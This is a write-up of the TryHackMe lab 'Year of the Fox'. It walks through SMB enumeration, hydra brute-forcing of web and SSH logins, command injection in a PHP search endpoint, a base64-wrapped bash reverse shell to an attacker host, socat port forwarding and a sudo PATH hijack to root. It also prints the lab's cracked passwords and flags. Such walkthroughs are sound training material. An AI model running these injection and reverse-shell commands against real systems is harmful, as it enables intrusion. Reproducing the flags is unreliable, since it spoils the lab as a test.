# TryHackMe — Year of the Fox | Full Writeup

**Room:** <https://tryhackme.com/room/yotf>  
**Difficulty:** Hard  
**OS:** Linux (Samba masquerading as a Windows host)

Year of the Fox is a multi-stage Linux box built around a Samba server that fingerprints itself as Windows and a custom "search system" web app protected by HTTP Basic Auth. The chain starts with SMB enumeration to pull out valid usernames, moves to a brute-forced Basic Auth login, and from there into a command-injection bug in the search endpoint that gives a `www-data` shell. Since SSH only listens on loopback, a statically compiled `socat` binary is used to forward it to an external port, where a second brute-force attack lands valid SSH credentials. Root comes from a `sudo` rule on `shutdown` that internally calls `poweroff` without an absolute path — a classic PATH-hijack privilege escalation.

---

## 1. Reconnaissance

```
nmap $IP -p- --open -sV -sC -Pn
```

```
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic realm=You want in? Gotta guess the password!
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
```

```
smb-os-discovery:
  OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
  Computer name: year-of-the-fox
  Domain name: lan
```

Port 80 demands HTTP Basic Auth before showing anything, so there are no credentials to try yet. Samba reports itself as a Windows 6.1 host, which is just Samba's OS-emulation string — the box is Linux, confirmed later once a shell lands.

---

## 2. SMB Enumeration

```
enum4linux $IP
```

```
[+] Got domain/workgroup name: YEAROFTHEFOX
[+] Server $IP allows sessions using username '', password ''

Sharename       Type      Comment
---------       ----      -------
yotf            Disk      Fox's Stuff -- keep out!
IPC$            IPC       IPC Service

[+] Password Complexity: Disabled
[+] Minimum Password Length: 5

S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)
```

Null sessions are allowed, which is enough to pull the share list and RID-cycle two real Unix accounts: **fox** and **rascal**. The `yotf` share exists but access is denied to an anonymous session:

```
netexec smb $IP -u 'guest' -p '' --shares
smbclient //$IP/yotf -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

The password policy also confirms complexity is disabled and the minimum length is only 5 characters — a strong hint that brute-forcing is the intended path rather than exploiting a service vulnerability.

---

## 3. Brute-Forcing HTTP Basic Auth

With `rascal` confirmed as a valid account from SMB, the same credential was tried against the web server's Basic Auth prompt:

```
hydra -l rascal -P /usr/share/wordlists/rockyou.txt -s 80 -f $IP http-get / -t 54
```

```
[80][http-get] host: $IP   login: rascal   password: cookie12
```

**Credentials:** `rascal:cookie12`

---

## 4. The Search System — Command Injection

Logging in at `http://$IP/` with the recovered credentials revealed a single-page app:

```html
<h1>Rascal's Search System</h1>
<input type=text id="target" placeholder="Looking for something?">
<button id=search onclick="submit();">Search!</button>
```

Submitting an empty query listed three filenames on the server: `creds2.txt`, `fox.txt`, `important-data.txt`. The search box posts to a PHP endpoint:

```
POST /assets/php/search.php?file=creds2.txt
Authorization: Basic <rascal:cookie12>
{"target":"\";pwd \""}
```

```
["\/var\/www\/html\/assets\/php"]
```

The response to a broken-out `pwd` command executing server-side confirms the `target` value is passed straight into a shell command without sanitization — the `"; ... "` sequence closes whatever quoting the backend uses and appends an arbitrary command.

### From injection to a shell

To avoid quoting issues with a raw reverse-shell one-liner, the payload was base64-encoded and decoded server-side before execution:

```
echo -n "bash -i >& /dev/tcp/$LHOST/1234 0>&1" | base64
```

```
POST /assets/php/search.php?file=creds2.txt
{"target":"\";echo <base64-payload> | base64 -d | bash; \""}
```

```
nc -lvnp 1234
```

```
connect to [$LHOST] from (UNKNOWN) [$IP] 59656
www-data@year-of-the-fox:/var/www/html/assets/php$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Post-Exploitation — Chasing the Listed Files

```
find / -type f -iname "creds2.txt" 2>/dev/null
/var/www/files/creds2.txt
```

```
cd /var/www/files
ls -la
-rw-r--r-- 1 root root  154 creds2.txt
-rw-r--r-- 1 root root    0 fox.txt
-rw-r--r-- 1 root root    0 important-data.txt
```

`fox.txt` and `important-data.txt` are empty — a deliberate dead end. `creds2.txt` holds a Base32 blob:

```
cat creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJ...
```

Decoding it peels back two layers:

```
echo "<blob>" | base32 -d
# → base64 string

echo "<base64>" | base64 -d
c74341b26d29ad41da6cc68feedebd161103776555c21d77e3c2aa36d8c44730  -
```

`hash-identifier` flags the result as SHA-256. This value never gets used anywhere further in the box — it's a rabbit hole meant to burn time on cracking a hash that has no bearing on the intended path. A more productive lead was a separate, root-owned file sitting one directory up:

```
cat /var/www/web-flag.txt
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
```

---

## 6. Reaching SSH — Port Forwarding with socat

SSH isn't exposed externally; the fingerprint only shows 80, 139 and 445. Since a command-execution primitive already exists as `www-data`, a statically linked `socat` binary was pulled onto the box and used to forward the loopback-only SSH port to something reachable from outside:

```
# Attacker
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat_static
python3 -m http.server 8000

# Target (via the www-data shell)
wget http://$LHOST:8000/socat_static -O socat
chmod +x socat
./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
```

Port 2222 on `$IP` now proxies straight to the box's internal SSH daemon.

### Brute-forcing SSH

```
hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://$IP -s 2222 -t 54
```

```
[2222][ssh] host: $IP   login: fox   password: celtic
```

```
ssh fox@$IP -p 2222
```

```
fox@year-of-the-fox:~$ cat user-flag.txt
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
```

**User flag found.**

---

## 7. Privilege Escalation — sudo shutdown, Relative Path Hijack

```
fox@year-of-the-fox:~$ sudo -l
User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

`shutdown` isn't a common GTFOBins entry, so instead of assuming a known technique, the binary was pulled to the attacker machine and opened in a disassembler (Hopper) to see what it actually does:

```c
void main() {
    system("poweroff");
    return;
}
```

It calls `poweroff` by name only, with no absolute path. When `system()` runs a bare command name, the shell resolves it by walking `$PATH` — so whichever `poweroff` appears first on `$PATH` is the one that executes, regardless of where the "real" `/usr/sbin/poweroff` lives. Since this binary runs as root via `sudo`, controlling `$PATH` means controlling what root executes.

### Exploiting the relative path

```
fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff
fox@year-of-the-fox:/tmp$ chmod +x /tmp/poweroff
fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown
root@year-of-the-fox:/tmp#
```

With `/tmp` prepended to `$PATH`, the fake `poweroff` (really just `bash`) resolves first. `shutdown` runs as root via the NOPASSWD rule, calls `poweroff`, and gets a root-owned copy of Bash instead — landing a root shell.

```
root@year-of-the-fox:/tmp# whoami
root
```

**Root flag** was located from here via standard post-root enumeration (not shown in the captured session — add the value once retrieved).

---

## Attack Chain

```
nmap ($IP → 80, 139, 445)
  └─→ enum4linux → null session → users: fox, rascal + share "yotf"
        └─→ hydra (rascal, rockyou) → HTTP Basic Auth → cookie12
              └─→ Rascal's Search System → command injection in search.php
                    └─→ base64-wrapped reverse shell → www-data
                          └─→ /var/www/files/* → creds2.txt (rabbit hole, SHA-256)
                          └─→ /var/www/web-flag.txt
                                └─→ socat port-forward 22 → 2222 (external)
                                      └─→ hydra (fox, rockyou) → SSH → celtic
                                            └─→ SSH as fox → user-flag.txt
                                                  └─→ sudo -l → /usr/sbin/shutdown NOPASSWD
                                                        └─→ disassemble shutdown → calls poweroff (relative path)
                                                              └─→ PATH hijack (/tmp/poweroff = bash)
                                                                    └─→ sudo shutdown → root shell
```

---

## Key Concepts

| Concept | Explanation |
|---|---|
| **Samba OS-fingerprint spoofing** | Samba can be configured to report itself as a Windows version in NetBIOS/SMB negotiation even while running on Linux. Nmap and enum4linux read whatever the service advertises, so the reported OS should never be trusted over independent enumeration. |
| **Null session SMB enumeration** | A share and password-policy readable with empty credentials lets an attacker pull usernames and lockout settings before ever authenticating — exactly what `enum4linux`/RID cycling is built for. |
| **Weak password policy as a signal** | A five-character minimum with complexity disabled isn't just bad practice, it's a direct signal to the attacker that dictionary brute-forcing is viable and intended. |
| **Command injection via string concatenation** | If user input is dropped into a shell command string without escaping, closing the existing quote (`";`) and appending a new command lets an attacker run anything the web server's user can run. |
| **Base64-wrapping a payload** | Reverse-shell one-liners contain characters (`&`, `>`, quotes) that break easily inside an already-quoted injection point. Encoding the payload and decoding it server-side (`base64 -d | bash`) avoids that entirely. |
| **Deliberate rabbit holes** | Not every discovered file leads somewhere. A file that decodes into an unrelated hash with no further use in the chain is a reminder to keep testing the *other* leads instead of sinking time into cracking it. |
| **Pivoting a loopback-only service with socat** | When a service is bound to `127.0.0.1`, a foothold on the box can still expose it externally by forwarding a new listening port to that loopback address — no SSH tunnel needed, just a static binary and no dependency on the target's package manager. |
| **sudo + relative path privilege escalation** | A `sudo` rule on a binary is only as safe as everything that binary calls internally. If it invokes another program by name instead of full path, manipulating `$PATH` before running it lets an attacker substitute their own binary — executed with the same privileges as the sudo rule. |

---

## Flags

| Flag | Path | Value |
|---|---|---|
| web-flag.txt | `/var/www/web-flag.txt` | `THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}` |
| user-flag.txt | `/home/fox/user-flag.txt` | `THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}` |
| root flag | `TBD` | *(add once retrieved from the root shell)* |
